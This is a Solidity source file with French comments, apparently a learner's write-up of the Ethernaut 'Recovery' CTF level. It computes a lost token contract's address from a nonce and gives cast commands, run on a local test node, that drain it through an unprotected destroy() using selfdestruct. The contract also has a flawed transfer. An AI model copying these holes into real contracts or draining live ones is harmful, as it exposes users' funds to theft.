// Un créateur de contrat a créé un contrat de fabrique de jetons très simple.
//  N'importe qui peut créer de nouveaux jetons en toute simplicité. Après avoir déployé
//  le premier contrat de jeton, le créateur a envoyé 0.001de l'éther pour obtenir plus de jetons.
//   Ils ont depuis perdu l'adresse du contrat.

// Ce niveau sera terminé si vous pouvez récupérer (ou supprimer) l' 0.001éther de l'adresse de contrat
//  perdue.
//Question:
// -Comment recupérer une adresse perdue d'un  contract
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    //J'ai besoin de connaitre l'adresse de celui qui avait deployé le contract
    //et son nonce lors du deploiement pour utiliser l'opcode CREATE pour calculer son adresse
    //La valeur du nonce sera alors alors la valeur actuelle du nonce de celui qui
    //a deployé le contract moins les 3 transactions qu'il a effectuée a savoir
    // celle de deploiement du contract Recovery, ensuite celle de l'appel de la fonction
    //generateToken pour deployer le contract SimpleToken et enfin
    //celle du transfert d'ethers a l'instance du contract SimpleToken pour avoir plus
    //de jetons
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

/* 
Methode utilisée
-> Je calcule l'adresse du contract grace a l'opcode CREATE en sachant que le nonce lors du deploiement
du contract est egale au nonce actuel du contract Recovery moins 1. Lors de l'appel de la fonction
generateToken par celui qui a deployé le contract voici ce qui se passe:
Le déployeur initie la transaction en appelant la fonction generateToken puis l'instance du
contract Recovery initie en ce moment une autre transaction qui consiste au deploiemnt du 
contract SimpleToken. Donc c'est l'instance du contract Recovery qui deploie le contract SimpleToken
Pour avoir donc l'adresse du contract SimpleToken, il me suffit d'avoir le nonce actuel
de l'instance du contract Recovery et je fais -1 pour avoir la valeur du nonce lors du deploiement
du contract SimpleToken. 

forge create src/Recovery.sol:Recovery --rpc-url 127.0.0.1:8545 --account anvil
r=0x5FbDB2315678afecb367f032d93F642f64180aa3

cast send $r "generateToken(string,uint256)" "ok" 100000000000000 --rpc-url 127.0.0.1:8545 --account anvil

Je calcule l'adresse du contract SimpleToken en faisant:
cast nonce $r 
output: 2 -> correpond au nonce actuel de l'instance du contract Recovery

cast compute-address $r --nonce 1
Computed Address: 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be -> qui correspond a l'adresse
du contract SimpleToken deployé par le contract Recovery
J'ai spécifié nonce egale a 1 car le nonce avant le deploiement
est egale au nonce actuel du contract a savoir 2 moins 1 
En essayant d'obtenir le name au slot 0 de SimpleToken par 
cast call 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be "name()"
output: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000026f6b000000000000000000000000000000000000000000000000000000000000
cast --to-utf8 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000026f6b000000000000000000000000000000000000000000000000000000000000
output: ok 
Ce qui prouve que 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be correspond au contract SimpleToken
A partir de l'adresse du contract SimpleToken à savoir 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be 
 j'appele maintenant la fonction destroy de SimpleToken avec mon adresse qui enverra tous les fonds
de ce contract à mon adresse.
cast send 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be "destroy(address)" 
0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 --account anvil

*/

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
